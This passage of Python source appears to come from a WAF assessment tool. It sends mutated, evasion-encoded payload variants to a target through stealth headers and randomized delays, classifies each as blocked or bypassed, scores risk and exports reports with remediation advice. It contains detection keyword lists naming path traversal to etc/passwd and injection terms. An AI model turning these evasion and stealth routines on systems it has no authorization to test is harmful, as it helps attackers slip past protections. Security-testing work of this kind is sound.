            logger.debug(f"Added test header: {header_name.strip()} (variant: {payload_variant.get('encoding', 'original')})")
        except ValueError:
            headers["X-Test-Vector"] = payload
    elif payload.startswith(("http://", "https://")):
        # URL payload
        test_url = payload
    else:
        # Data payload
        data = payload
        content_types = [
            "application/x-www-form-urlencoded",
            "application/json",
            "text/plain"
        ]
        headers["Content-Type"] = random.choice(content_types)
        headers["Content-Length"] = str(len(payload))
    
    return headers, data, test_url

def execute_enterprise_request(test_url: str, headers: Dict, data: Optional[str]) -> Tuple[requests.Response, float]:
    """Execute request with enterprise-grade error handling and optimization"""
    proxies = None
    if PROXY:
        proxies = {"http": PROXY, "https": PROXY}
    
    for attempt in range(EnterpriseConfig.MAX_RETRIES):
        try:
            start_time = time.time()
            
            # Create session with optimizations
            session = requests.Session()
            session.verify = False
            
            # Connection pooling and optimization
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=10,
                pool_maxsize=20,
                max_retries=0  # We handle retries manually
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            # Execute request
            response = session.request(
                method='GET',
                url=test_url,
                headers=headers,
                data=data,
                proxies=proxies,
                timeout=EnterpriseConfig.REQUEST_TIMEOUT,
                allow_redirects=False,
                stream=False
            )
            
            duration = time.time() - start_time
            return response, duration
            
        except requests.exceptions.Timeout:
            logger.warning(f"Request timeout on attempt {attempt + 1}")
            if attempt == EnterpriseConfig.MAX_RETRIES - 1:
                raise
            time.sleep(random.uniform(2, 5))
            
        except requests.exceptions.ConnectionError as e:
            logger.warning(f"Connection error on attempt {attempt + 1}: {str(e)}")
            if attempt == EnterpriseConfig.MAX_RETRIES - 1:
                raise
            time.sleep(random.uniform(3, 8))
        
        except requests.exceptions.SSLError as e:
            logger.warning(f"SSL error on attempt {attempt + 1}: {str(e)}")
            if attempt == EnterpriseConfig.MAX_RETRIES - 1:
                raise
            time.sleep(random.uniform(1, 3))
    
    raise Exception("Max retries exceeded in enterprise request execution")

def calculate_advanced_risk_score(result: EnterpriseTestResult) -> int:
    """Calculate advanced risk score with multiple factors"""
    score = 0
    
    # Base score by severity with enhanced weighting
    severity_scores = {"critical": 35, "high": 28, "medium": 22, "low": 18}
    score += severity_scores.get(result.severity.lower(), 18)
    
    # Result-based scoring with WAF confidence consideration
    if result.result == "BYPASSED":
        score += 25
        # Additional risk for high-confidence WAF bypass
        if result.waf_confidence > 0.8:
            score += 15
        elif result.waf_confidence > 0.5:
            score += 8
    elif result.result == "BLOCKED":
        score = max(score - 20, 0)
        # Bonus for high-confidence detection
        if result.waf_confidence > 0.8:
            score = max(score - 5, 0)
    
    # Category-specific risk adjustments
    high_risk_categories = {
        "xss": 15, "sqli": 18, "rce": 20, "lfi": 16, "command injection": 20,
        "path traversal": 14, "xxe": 16, "ssti": 18, "nosql injection": 16
    }
    
    for category, risk_bonus in high_risk_categories.items():
        if category in result.category.lower():
            score += risk_bonus
            break
    
    # Payload complexity factor
    payload_complexity = len(result.payload) + len(result.payload_variants)
    if payload_complexity > 50:
        score += 5
    
    # AI analysis enhancement
    if result.ai_analysis.get('high_evasion_potential', False):
        score += 10
    
    # Behavioral analysis factors
    if result.behavioral_analysis:
        timing_analysis = result.behavioral_analysis.get("timing_analysis", "")
        if "Slow response" in timing_analysis:
            score += 3  # Potential evasion or analysis
        if "Fast blocking" in timing_analysis:
            score -= 3  # Efficient blocking
    
    return min(score, 100)  # Cap at 100

def generate_enterprise_recommendation(result: EnterpriseTestResult) -> str:
    """Generate comprehensive security recommendations with prioritization"""
    if not EnterpriseConfig.GENERATE_RECOMMENDATIONS:
        return ""
    
    recommendations = []
    priority_level = "HIGH" if result.risk_score > 75 else "MEDIUM" if result.risk_score > 50 else "LOW"
    
    recommendations.append(f"[{priority_level}]")
    
    if result.result == "BYPASSED":
        category = result.category.lower()
        
        # Category-specific recommendations
        if "xss" in category:
            recommendations.extend([
                "Implement Content Security Policy (CSP) with strict-dynamic",
                "Configure WAF rules for XSS pattern detection with context awareness",
                "Enable XSS protection headers and secure cookie attributes",
                "Deploy input validation and output encoding at application layer"
            ])
        elif "sqli" in category or "sql" in category:
            recommendations.extend([
                "Strengthen SQL injection detection with semantic analysis",
                "Implement prepared statements and parameterized queries",
                "Enable database activity monitoring and query analysis",
                "Deploy database firewall with real-time threat detection"
            ])
        elif "rce" in category or "command" in category:
            recommendations.extend([
                "CRITICAL: Implement strict command execution filtering immediately",
                "Deploy application sandboxing and process isolation",
                "Enable system call monitoring and behavioral analysis",
                "Implement principle of least privilege for application processes"
            ])
        elif "lfi" in category or "path" in category:
            recommendations.extend([
                "Configure advanced path traversal protection rules",
                "Implement file access controls with chroot jails",
                "Deploy file integrity monitoring and access logging",
                "Enable directory access restrictions and validation"
            ])
        elif "xxe" in category:
            recommendations.extend([
                "Disable XML external entity processing completely",
                "Implement secure XML parsers with entity resolution disabled",
                "Deploy XML schema validation and input sanitization",
                "Enable XML parsing security controls"
            ])
        else:
            recommendations.extend([
                "Review and update WAF rules for this specific attack pattern",
                "Implement custom detection rules based on attack characteristics",
                "Enable enhanced logging and monitoring for similar patterns",
                "Consider threat intelligence integration for emerging threats"
            ])
        
        # WAF-specific recommendations
        if result.waf_type and result.waf_type != "Unknown" and result.waf_type != "Generic WAF":
            recommendations.append(f"Consult {result.waf_type} documentation for advanced rule configuration")
        
        # AI analysis-based recommendations
        if result.ai_analysis:
            if result.ai_analysis.get('evasion_technique_detected'):
                recommendations.append("Deploy anti-evasion techniques and payload normalization")
            if result.ai_analysis.get('automated_attack_pattern'):
                recommendations.append("Implement rate limiting and behavioral analysis")
        
        # Payload variant analysis
        if result.successful_variant and result.successful_variant.get('technique') != 'none':
            technique = result.successful_variant.get('technique', 'unknown')
            recommendations.append(f"Address {technique} evasion technique vulnerability")
    
    elif result.result == "BLOCKED":
        recommendations.extend([
            f"{result.waf_type} successfully blocked this attack",
            "Continue monitoring for variant attacks and evasion attempts",
            "Regularly update WAF signatures and threat intelligence",
            "Implement behavioral analysis for zero-day attack detection"
        ])
        
        # High confidence blocking gets additional recommendations
        if result.waf_confidence > 0.9:
            recommendations.append("Excellent detection confidence - monitor for false positives")
    
    else:  # FAILED
        recommendations.extend([
            "Unable to determine WAF effectiveness - investigate connectivity",
            "Review WAF deployment architecture and network positioning",
            "Check for SSL/TLS configuration issues and certificate problems",
            "Verify WAF bypass or misconfiguration possibilities"
        ])
    
    # Compliance-based recommendations
    if result.compliance_impact:
        for standard, impact in result.compliance_impact.items():
            if impact.get('critical', False):
                recommendations.append(f"Address {standard.upper()} compliance requirement immediately")
    
    return " | ".join(recommendations[:4])  # Limit to top 4 recommendations

def perform_ai_analysis(result: EnterpriseTestResult) -> Dict:
    """Perform AI-powered analysis on test results"""
    if not EnterpriseConfig.ENABLE_AI_ANALYSIS:
        return {}
    
    analysis = {
        'evasion_technique_detected': False,
        'automated_attack_pattern': False,
        'high_evasion_potential': False,
        'threat_sophistication': 'Low',
        'attack_vector_classification': 'Standard',
        'confidence_assessment': 'Medium'
    }
    
    try:
        # Evasion technique detection
        if result.successful_variant and result.successful_variant.get('technique') != 'none':
            analysis['evasion_technique_detected'] = True
            analysis['threat_sophistication'] = 'Medium'
        
        # Check for multiple variant attempts
        if len(result.payload_variants) > 5:
            analysis['automated_attack_pattern'] = True
            analysis['threat_sophistication'] = 'High'
        
        # High evasion potential analysis
        evasion_indicators = [
            'unicode_encode' in str(result.payload_variants),
            'comment_insertion' in str(result.payload_variants),
            'concatenation' in str(result.payload_variants),
            result.waf_confidence < 0.3 and result.result == "BYPASSED"
        ]
        
        if sum(evasion_indicators) >= 2:
            analysis['high_evasion_potential'] = True
            analysis['threat_sophistication'] = 'Very High'
        
        # Attack vector classification
        payload_lower = result.payload.lower()
        if any(keyword in payload_lower for keyword in ['script', 'alert', 'onerror', 'onload']):
            analysis['attack_vector_classification'] = 'XSS'
        elif any(keyword in payload_lower for keyword in ['union', 'select', 'insert', 'delete']):
            analysis['attack_vector_classification'] = 'SQL Injection'
        elif any(keyword in payload_lower for keyword in ['exec', 'eval', 'system', 'cmd']):
            analysis['attack_vector_classification'] = 'Code Injection'
        elif any(keyword in payload_lower for keyword in ['../', '..\\\\', 'etc/passwd']):
            analysis['attack_vector_classification'] = 'Path Traversal'
        
        # Confidence assessment based on multiple factors
        confidence_factors = [
            result.waf_confidence > 0.8,
            result.duration < 2.0,  # Fast response
            len(result.waf_indicators) > 2,
            result.status_code in EnterpriseConfig.BLOCKED_STATUS_CODES
        ]
        
        confidence_score = sum(confidence_factors) / len(confidence_factors)
        if confidence_score > 0.75:
            analysis['confidence_assessment'] = 'High'
        elif confidence_score > 0.5:
            analysis['confidence_assessment'] = 'Medium'
        else:
            analysis['confidence_assessment'] = 'Low'
    
    except Exception as e:
        logger.debug(f"AI analysis error: {e}")
    
    return analysis

def assess_compliance_impact(result: EnterpriseTestResult) -> Dict:
    """Assess compliance impact for various standards"""
    if not EnterpriseConfig.ENABLE_COMPLIANCE_REPORTING:
        return {}
    
    impact = {}
    
    try:
        # OWASP ASVS impact assessment
        owasp_impact = {'level': 1, 'critical': False}
        if result.result == "BYPASSED":
            if result.severity in ['critical', 'high']:
                owasp_impact['level'] = 3
                owasp_impact['critical'] = True
            elif result.severity == 'medium':
                owasp_impact['level'] = 2
        impact['owasp_asvs'] = owasp_impact
        
        # PCI DSS impact assessment
        pci_impact = {'requirement_affected': [], 'critical': False}
        if result.result == "BYPASSED":
            if "xss" in result.category.lower() or "sqli" in result.category.lower():
                pci_impact['requirement_affected'].extend(['6.5.1', '6.5.7'])
                pci_impact['critical'] = result.severity in ['critical', 'high']
        impact['pci_dss'] = pci_impact
        
        # ISO 27001 impact assessment
        iso_impact = {'controls_affected': [], 'risk_level': 'Low'}
        if result.result == "BYPASSED":
            iso_impact['controls_affected'].extend(['A.14.2.1', 'A.14.2.5'])
            if result.risk_score > 75:
                iso_impact['risk_level'] = 'High'
            elif result.risk_score > 50:
                iso_impact['risk_level'] = 'Medium'
        impact['iso_27001'] = iso_impact
        
        # NIST Cybersecurity Framework impact
        nist_impact = {'functions_affected': [], 'priority': 'Low'}
        if result.result == "BYPASSED":
            nist_impact['functions_affected'].extend(['PR.DS', 'DE.CM'])
            if result.severity in ['critical', 'high']:
                nist_impact['priority'] = 'High'
        impact['nist_csf'] = nist_impact
    
    except Exception as e:
        logger.debug(f"Compliance assessment error: {e}")
    
    return impact

def run_enterprise_test(test_data: Dict) -> EnterpriseTestResult:
    """Execute a single test with enterprise-grade analysis"""
    result = EnterpriseTestResult(
        id=test_data["id"],
        category=test_data["category"],
        name=test_data["name"],
        description=test_data["description"],
        severity=test_data["severity"],
        payload=test_data["payload"],
        original_payload=test_data["payload"],
        timestamp=datetime.now().isoformat()
    )
    
    logger.info(f"Executing Enterprise Test {result.id}: {result.name} ({result.severity})", 
               test_id=result.id, category="TEST_EXECUTION")
    
    try:
        # Generate payload variants using advanced mutation engine
        result.payload_variants = mutation_engine.generate_payload_variants(result.payload)
        logger.debug(f"Generated {len(result.payload_variants)} payload variants", test_id=result.id)
        
        # Test each payload variant until blocked or all tested
        for i, payload_variant in enumerate(result.payload_variants):
            if i > 0:
                logger.debug(f"Testing variant {i}: {payload_variant['encoding']} encoding", test_id=result.id)
            
            headers, data, test_url = prepare_stealth_request(payload_variant)
            response, duration = execute_enterprise_request(test_url, headers, data)
            
            # Collect comprehensive response data
            result.status_code = response.status_code
            result.response_headers = dict(response.headers)
            result.response_size = len(response.content) if hasattr(response, 'content') else 0
            result.duration = round(duration, 3)
            result.successful_variant = payload_variant
            
            # Generate response hash for caching and analysis
            if hasattr(response, 'content'):
                result.response_hash = hashlib.md5(response.content).hexdigest()
                result.response_body_snippet = response.text[:2000]  # First 2KB
            
            # Advanced AI-powered WAF detection
            waf_detected, waf_type, confidence, indicators, waf_analysis = ai_waf_detector.analyze_response_advanced(
                result.response_headers, 
                result.status_code, 
                result.response_body_snippet,
                result.duration,
                payload_variant['payload']
            )
            
            result.waf_detected = waf_detected
            result.waf_type = waf_type
            result.waf_confidence = confidence
            result.waf_indicators = indicators
            result.waf_analysis = waf_analysis
            
            # Perform behavioral analysis
            result.behavioral_analysis = analyze_response_behavior_advanced(
                result.response_headers,
                result.status_code,
                result.response_body_snippet,
                result.duration,
                payload_variant
            )
            
            # Determine blocking status with enhanced logic
            result.blocked = (
                result.status_code in EnterpriseConfig.BLOCKED_STATUS_CODES or
                waf_detected or
                any(keyword in result.response_body_snippet.lower() for keyword in EnterpriseConfig.WAF_KEYWORDS) or
                (len(result.response_body_snippet) < 150 and result.status_code in [400, 403, 406])
            )
            
            result.result = "BLOCKED" if result.blocked else "BYPASSED"
            
            # Determine detection method with enhanced classification
            if result.status_code in EnterpriseConfig.BLOCKED_STATUS_CODES:
                result.detection_method = f"Status Code Analysis ({result.status_code})"
            elif waf_detected and confidence > 0.7:
                result.detection_method = f"AI WAF Detection ({waf_type}, {confidence:.0%})"
            elif waf_detected:
                result.detection_method = f"Heuristic Analysis ({waf_type})"
            elif any(keyword in result.response_body_snippet.lower() for keyword in EnterpriseConfig.WAF_KEYWORDS):
                result.detection_method = "Content Pattern Analysis"
            else:
                result.detection_method = "Behavioral Analysis"
            
            # Save full response for enterprise analysis
            if EnterpriseConfig.SAVE_FULL_RESPONSES and hasattr(response, 'content'):
                response_file = os.path.join(OUTPUT_DIR, "responses", f"enterprise_test_{result.id:03d}_variant_{i}.json")
                response_data = {
                    'test_id': result.id,
                    'variant_index': i,
                    'payload_variant': payload_variant,
                    'status_code': result.status_code,
                    'headers': result.response_headers,
                    'body': response.text,
                    'waf_analysis': result.waf_analysis,
                    'timestamp': datetime.now().isoformat()
                }
                with open(response_file, "w", encoding="utf-8") as f:
                    json.dump(response_data, f, indent=2, ensure_ascii=False)
            
            # Log performance metrics
            logger.performance(
                f"Variant {i} completed: {result.result}", 
                test_id=result.id, 
                response_time=result.duration,
                response_size=result.response_size,
                status_code=result.status_code,
                waf_confidence=result.waf_confidence
            )
            
            # If blocked, we found the WAF threshold - stop testing variants
            if result.blocked:
                logger.info(f"WAF blocking detected with variant {i} ({payload_variant['encoding']})", test_id=result.id)
                break
            
            # Apply intelligent traffic shaping between variants
            if i < len(result.payload_variants) - 1:
                delay = intelligent_traffic_shaping()
                logger.debug(f"Traffic shaping delay: {delay:.2f}s", test_id=result.id)
        
        # Perform AI analysis
        result.ai_analysis = perform_ai_analysis(result)
        
        # Assess compliance impact
        result.compliance_impact = assess_compliance_impact(result)
        
        # Calculate advanced risk score
        result.risk_score = calculate_advanced_risk_score(result)
        
        # Generate comprehensive recommendations
        result.recommendation = generate_enterprise_recommendation(result)
        
        # Performance metrics
        result.performance_metrics = {
            'variants_tested': len(result.payload_variants),
            'successful_variant_index': result.payload_variants.index(result.successful_variant) if result.successful_variant in result.payload_variants else 0,
            'average_response_time': result.duration,
            'data_efficiency': result.response_size / len(result.payload) if result.payload else 0
        }
        
        logger.info(f"Test completed: {result.result} | WAF: {result.waf_type} ({result.waf_confidence:.0%}) | Risk: {result.risk_score} | AI: {result.ai_analysis.get('threat_sophistication', 'Unknown')}", test_id=result.id)
        
    except Exception as e:
        result.result = "FAILED"
        result.error = str(e)
        logger.error(f"Enterprise test {result.id} failed: {str(e)}", test_id=result.id, category="TEST_FAILURE")
    
    # Save comprehensive individual result
    result_file = os.path.join(OUTPUT_DIR, "analysis", f"enterprise_test_{result.id:03d}.json")
    with open(result_file, "w", encoding="utf-8") as f:
        json.dump(asdict(result), f, indent=2, ensure_ascii=False, default=str)
    
    return result

def analyze_response_behavior_advanced(headers: Dict, status_code: int, response_body: str, 
                                     response_time: float, payload_variant: Dict) -> Dict:
    """Advanced behavioral analysis with machine learning insights"""
    behavior = {
        "content_analysis": {},
        "timing_analysis": {},
        "header_analysis": {},
        "encoding_analysis": {},
        "payload_analysis": {},
        "ml_insights": {}
    }
    
    try:
        # Enhanced content analysis
        content_type = headers.get('content-type', '').lower()
        behavior["content_analysis"] = {
            "content_type": content_type,
            "response_length": len(response_body),
            "is_html": 'text/html' in content_type,
            "is_json": 'application/json' in content_type,
            "has_error_patterns": any(pattern in response_body.lower() for pattern in ['error', 'exception', 'denied', 'blocked']),
            "compression_detected": 'gzip' in headers.get('content-encoding', '') or 'deflate' in headers.get('content-encoding', '')
        }
        
        # Advanced timing analysis with statistical insights
        behavior["timing_analysis"] = {
            "response_time": response_time,
            "timing_category": "fast" if response_time < 0.5 else "normal" if response_time < 2.0 else "slow",
            "potential_analysis_time": response_time > 3.0,  # Might indicate WAF analysis
            "potential_challenge": response_time > 5.0,  # Might indicate challenge/captcha
        }
        
        # Comprehensive header analysis
        security_headers = ['x-frame-options', 'x-content-type-options', 'x-xss-protection', 'strict-transport-security', 'content-security-policy']
        waf_headers = ['cf-ray', 'x-sucuri-id', 'incap-ses', 'x-akamai-request-id', 'server']
        
        behavior["header_analysis"] = {
            "security_headers_present": [h for h in security_headers if h in [k.lower() for k in headers.keys()]],
            "waf_headers_present": [h for h in waf_headers if any(waf_h in k.lower() or waf_h in v.lower() for k, v in headers.items() for waf_h in [h])],
            "server_header": headers.get('server', 'Unknown'),
            "cache_headers": {
                "cache_control": headers.get('cache-control', ''),
                "etag": headers.get('etag', ''),
                "last_modified": headers.get('last-modified', '')
            },
            "total_headers": len(headers)
        }
        
        # Encoding and compression analysis
        behavior["encoding_analysis"] = {
            "content_encoding": headers.get('content-encoding', ''),
            "transfer_encoding": headers.get('transfer-encoding', ''),
            "charset": 'charset=' in headers.get('content-type', ''),
            "compression_ratio": 0  # Would need original size to calculate
        }
        
        # Payload-specific analysis
        behavior["payload_analysis"] = {
            "encoding_method": payload_variant.get('encoding', 'original'),
            "evasion_technique": payload_variant.get('technique', 'none'),
            "payload_length": len(payload_variant.get('payload', '')),
            "complexity_score": len(set(payload_variant.get('payload', ''))) / len(payload_variant.get('payload', '')) if payload_variant.get('payload') else 0
        }
        
        # Machine learning insights (simplified pattern recognition)
        if ADVANCED_ANALYTICS:
            behavior["ml_insights"] = {
                "anomaly_score": calculate_anomaly_score(headers, status_code, response_time),
                "pattern_similarity": calculate_pattern_similarity(response_body, status_code),
                "threat_probability": calculate_threat_probability(payload_variant, headers, status_code)
            }
    
    except Exception as e:
        logger.debug(f"Behavioral analysis error: {e}")
        behavior["analysis_error"] = str(e)
    
    return behavior

def calculate_anomaly_score(headers: Dict, status_code: int, response_time: float) -> float:
    """Calculate anomaly score using simple statistical methods"""
    try:
        # Simple anomaly detection based on common patterns
        anomaly_factors = []
        
        # Unusual status codes
        common_codes = [200, 301, 302, 403, 404, 500, 503]
        if status_code not in common_codes:
            anomaly_factors.append(0.3)
        
        # Unusual response times
        if response_time > 10.0 or response_time < 0.01:
            anomaly_factors.append(0.4)
        
        # Unusual header patterns
        if len(headers) < 3 or len(headers) > 20:
            anomaly_factors.append(0.2)
        
        return min(sum(anomaly_factors), 1.0)
    except:
        return 0.0

def calculate_pattern_similarity(response_body: str, status_code: int) -> float:
    """Calculate similarity to known WAF response patterns"""
    try:
        waf_patterns = [
            'blocked', 'denied', 'firewall', 'security', 'violation',
            'reference', 'incident', 'protection', 'threat'
        ]
        
        body_lower = response_body.lower()
        matches = sum(1 for pattern in waf_patterns if pattern in body_lower)
        
        # Normalize by number of patterns and add status code factor
        similarity = matches / len(waf_patterns)
        if status_code in [403, 406, 429]:
            similarity += 0.2
        
        return min(similarity, 1.0)
    except:
        return 0.0

def calculate_threat_probability(payload_variant: Dict, headers: Dict, status_code: int) -> float:
    """Calculate probability that this represents a real threat scenario"""
    try:
        threat_factors = []
        
        # Payload complexity
        payload = payload_variant.get('payload', '')
        if any(keyword in payload.lower() for keyword in ['script', 'union', 'exec', '../']):
            threat_factors.append(0.4)
        
        # Evasion technique sophistication
        technique = payload_variant.get('technique', 'none')
        if technique in ['unicode_encode', 'comment_insertion', 'concatenation']:
            threat_factors.append(0.3)
        
        # Response characteristics
        if status_code in [403, 406] and len(headers) > 10:
            threat_factors.append(0.3)
        
        return min(sum(threat_factors), 1.0)
    except:
        return 0.0

def export_enterprise_reports():
    """Export comprehensive enterprise reports in multiple formats"""
    logger.info("Generating comprehensive enterprise reports...")
    
    # Export CSV with enhanced data
    if 'csv' in EnterpriseConfig.EXPORT_FORMATS:
        export_enhanced_csv()
    
    # Export JSON with full analysis
    if 'json' in EnterpriseConfig.EXPORT_FORMATS:
        export_comprehensive_json()
    
    # Export XML for enterprise integration
    if 'xml' in EnterpriseConfig.EXPORT_FORMATS:
        export_xml_report()

def export_enhanced_csv():
    """Export enhanced CSV with all enterprise metrics"""
    csv_path = os.path.join(OUTPUT_DIR, "exports", "enterprise_assessment.csv")
    
    with open(csv_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        
        # Enhanced header with all metrics
        writer.writerow([
            "Test ID", "Category", "Test Name", "Severity", "Result", "Status Code", 
            "Duration", "WAF Type", "WAF Confidence", "Risk Score", "Detection Method",
            "Payload Variants", "Successful Variant", "AI Threat Level", "Compliance Impact",
            "Response Size", "Evasion Technique", "Behavioral Score", "Recommendation"
        ])
        
        # Enhanced data rows
        for test in results.tests:
            writer.writerow([
                test.id, test.category, test.name, test.severity, test.result,
                test.status_code or "N/A", f"{test.duration:.3f}s", test.waf_type,
                f"{test.waf_confidence:.0%}", test.risk_score, test.detection_method,
                len(test.payload_variants), test.successful_variant.get('encoding', 'original'),
                test.ai_analysis.get('threat_sophistication', 'Unknown'),
                len(test.compliance_impact), test.response_size,
                test.successful_variant.get('technique', 'none'),
                test.behavioral_analysis.get('ml_insights', {}).get('threat_probability', 0),
                test.recommendation[:100] + "..." if len(test.recommendation) > 100 else test.recommendation
            ])
    
    logger.info(f"Enhanced CSV report exported: {csv_path}")

def export_comprehensive_json():
    """Export comprehensive JSON with full enterprise analysis"""
    json_path = os.path.join(OUTPUT_DIR, "exports", "enterprise_comprehensive.json")
    
    # Calculate advanced metrics
    results.calculate_performance_metrics()
    results.generate_compliance_scores()
    
    comprehensive_data = {
        "metadata": {
            "target_url": TARGET_URL,
            "assessment_date": datetime.now().isoformat(),
            "tool_version": "Enterprise WAF Assessment Platform v5.0",
            "proxy_configuration": PROXY,
            "total_duration": sum(test.duration for test in results.tests),
            "categories_tested": list(results.categories_tested),
            "configuration": {
                "ai_analysis_enabled": EnterpriseConfig.ENABLE_AI_ANALYSIS,
                "behavioral_learning": EnterpriseConfig.ENABLE_BEHAVIORAL_LEARNING,
                "payload_mutation": EnterpriseConfig.ENABLE_PAYLOAD_MUTATION,
                "stealth_mode": EnterpriseConfig.ENABLE_STEALTH_MODE,
                "traffic_shaping": EnterpriseConfig.ENABLE_TRAFFIC_SHAPING,
                "parallel_threads": EnterpriseConfig.PARALLEL_THREADS
            }
        },
        "executive_summary": {
            "total_tests": results.total,
            "blocked_tests": results.blocked,
            "bypassed_tests": results.bypassed,
            "failed_tests": results.failed,
            "effectiveness_percentage": results.get_effectiveness(),
            "detected_waf_technologies": list(results.waf_fingerprints),
            "average_waf_confidence": statistics.mean([test.waf_confidence for test in results.tests if test.waf_confidence > 0]) if any(test.waf_confidence > 0 for test in results.tests) else 0,
            "high_risk_bypasses": len([test for test in results.tests if test.result == "BYPASSED" and test.risk_score > 75]),
            "critical_vulnerabilities": len([test for test in results.tests if test.severity == "critical" and test.result == "BYPASSED"]),
            "ai_threat_assessment": {
                "high_sophistication_attacks": len([test for test in results.tests if test.ai_analysis.get('threat_sophistication') == 'Very High']),
                "evasion_techniques_detected": len([test for test in results.tests if test.ai_analysis.get('evasion_technique_detected', False)]),
                "automated_attack_patterns": len([test for test in results.tests if test.ai_analysis.get('automated_attack_pattern', False)])
            }
        },
        "performance_analytics": {
            "response_time_statistics": {
                "mean": results.performance.average_response_time,
                "median": statistics.median(results.performance.response_times) if results.performance.response_times else 0,
                "std_dev": statistics.stdev(results.performance.response_times) if len(results.performance.response_times) > 1 else 0,
                "min": min(results.performance.response_times) if results.performance.response_times else 0,
                "max": max(results.performance.response_times) if results.performance.response_times else 0
            },
            "throughput_metrics": {
                "requests_per_second": results.performance.requests_per_second,
                "total_data_transferred": results.performance.total_data_transferred,
                "average_response_size": results.performance.total_data_transferred / results.total if results.total > 0 else 0,
                "success_rate": results.performance.success_rate
            },
            "payload_effectiveness": dict(results.performance.payload_effectiveness)
        },
        "security_analysis": {
            "waf_detection_analysis": {
                "detection_methods": Counter([test.detection_method for test in results.tests]).most_common(),
                "confidence_distribution": {
                    "high_confidence": len([test for test in results.tests if test.waf_confidence > 0.8]),
                    "medium_confidence": len([test for test in results.tests if 0.5 < test.waf_confidence <= 0.8]),
                    "low_confidence": len([test for test in results.tests if 0.0 < test.waf_confidence <= 0.5]),
                    "no_confidence": len([test for test in results.tests if test.waf_confidence == 0.0])
                }
            },
            "risk_distribution": {
                "critical": len([test for test in results.tests if test.risk_score > 75]),
                "high": len([test for test in results.tests if 50 < test.risk_score <= 75]),
                "medium": len([test for test in results.tests if 25 < test.risk_score <= 50]),
                "low": len([test for test in results.tests if test.risk_score <= 25])
            },
            "category_effectiveness": {
                category: {
                    "total": len([test for test in results.tests if test.category == category]),
                    "blocked": len([test for test in results.tests if test.category == category and test.result == "BLOCKED"]),
                    "effectiveness": len([test for test in results.tests if test.category == category and test.result == "BLOCKED"]) / len([test for test in results.tests if test.category == category]) * 100 if any(test.category == category for test in results.tests) else 0
                }
                for category in results.categories_tested
            }
        },
        "compliance_assessment": results.compliance_scores,
        "behavioral_insights": {
            "status_code_patterns": dict(results.behavior_patterns),
            "response_time_patterns": {
                "fast_responses": len([test for test in results.tests if test.duration < 0.5]),
                "normal_responses": len([test for test in results.tests if 0.5 <= test.duration < 2.0]),
                "slow_responses": len([test for test in results.tests if test.duration >= 2.0])
            },
            "evasion_technique_success": {
                technique: len([test for test in results.tests if test.successful_variant.get('technique') == technique and test.result == "BYPASSED"])
                for technique in set(test.successful_variant.get('technique', 'none') for test in results.tests)
            }
        },
        "threat_intelligence": {
            "attack_patterns": Counter([test.ai_analysis.get('attack_vector_classification', 'Unknown') for test in results.tests]).most_common(),
            "sophistication_levels": Counter([test.ai_analysis.get('threat_sophistication', 'Unknown') for test in results.tests]).most_common(),
            "evasion_trends": Counter([test.successful_variant.get('technique', 'none') for test in results.tests]).most_common()
        },
        "detailed_results": [asdict(test) for test in results.tests]
    }
    
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(comprehensive_data, f, indent=2, ensure_ascii=False, default=str)
    
    logger.info(f"Comprehensive JSON report saved: {json_path}")

def export_xml_report():
    """Export XML report for enterprise integration"""
    xml_path = os.path.join(OUTPUT_DIR, "exports", "enterprise_assessment.xml")
    
    try:
        root = ET.Element("WAFAssessmentReport")
        root.set("version", "5.0")
        root.set("timestamp", datetime.now().isoformat())
        
        # Metadata
        metadata = ET.SubElement(root, "Metadata")
        ET.SubElement(metadata, "Target").text = TARGET_URL
        ET.SubElement(metadata, "TotalTests").text = str(results.total)
        ET.SubElement(metadata, "Effectiveness").text = f"{results.get_effectiveness():.1f}%"
        
        # WAF Technologies
        wafs = ET.SubElement(root, "DetectedWAFs")
        for waf in results.waf_fingerprints:
            waf_elem = ET.SubElement(wafs, "WAF")
            waf_elem.text = waf
        
        # Test Results
        tests_elem = ET.SubElement(root, "TestResults")
        for test in results.tests:
            test_elem = ET.SubElement(tests_elem, "Test")
            test_elem.set("id", str(test.id))
            test_elem.set("category", test.category)
            test_elem.set("severity", test.severity)
            test_elem.set("result", test.result)
            test_elem.set("risk_score", str(test.risk_score))
            
            ET.SubElement(test_elem, "Name").text = test.name
            ET.SubElement(test_elem, "WAFType").text = test.waf_type
            ET.SubElement(test_elem, "Confidence").text = f"{test.waf_confidence:.0%}"
            ET.SubElement(test_elem, "Duration").text = f"{test.duration:.3f}"
        
        # Write XML
        tree = ET.ElementTree(root)
        tree.write(xml_path, encoding="utf-8", xml_declaration=True)
        
        logger.info(f"XML report exported: {xml_path}")
    
    except Exception as e:
        logger.error(f"XML export error: {e}")

def generate_enterprise_dashboard():
    """Generate interactive enterprise dashboard with charts and analytics"""
    if not EnterpriseConfig.GENERATE_EXECUTIVE_DASHBOARD:
        return
    
    dashboard_path = os.path.join(OUTPUT_DIR, "dashboards", "enterprise_dashboard.html")
    
    effectiveness = results.get_effectiveness()
    results.calculate_performance_metrics()
    
    # Calculate comprehensive statistics for dashboard
    risk_distribution = {"Low": 0, "Medium": 0, "High": 0, "Critical": 0}
    category_stats = defaultdict(lambda: {"total": 0, "blocked": 0, "bypassed": 0})
    waf_detection_stats = defaultdict(int)
    
    for test in results.tests:
        # Risk distribution
        if test.risk_score <= 25:
            risk_distribution["Low"] += 1
        elif test.risk_score <= 50:
            risk_distribution["Medium"] += 1
        elif test.risk_score <= 75:
            risk_distribution["High"] += 1
        else:
            risk_distribution["Critical"] += 1
        
        # Category statistics
        category_stats[test.category]["total"] += 1
        if test.result == "BLOCKED":
            category_stats[test.category]["blocked"] += 1
        elif test.result == "BYPASSED":
            category_stats[test.category]["bypassed"] += 1
        
        # WAF detection statistics
        if test.waf_type != "Unknown":
            waf_detection_stats[test.waf_type] += 1
    
    # Prepare test results for dashboard
    test_rows = []
    for test in results.tests:
        # Risk indicator
        if test.risk_score <= 25:
            risk_class, risk_icon = "success", ""
        elif test.risk_score <= 50:
            risk_class, risk_icon = "warning", ""
        elif test.risk_score <= 75:
            risk_class, risk_icon = "danger", ""
        else:
            risk_class, risk_icon = "critical", ""
        
        # AI threat level
        threat_level = test.ai_analysis.get('threat_sophistication', 'Unknown')
        threat_class = {
            'Low': 'success',
            'Medium': 'warning', 
            'High': 'danger',
            'Very High': 'critical',
            'Unknown': 'secondary'
        }.get(threat_level, 'secondary')
        
        test_row = f'''
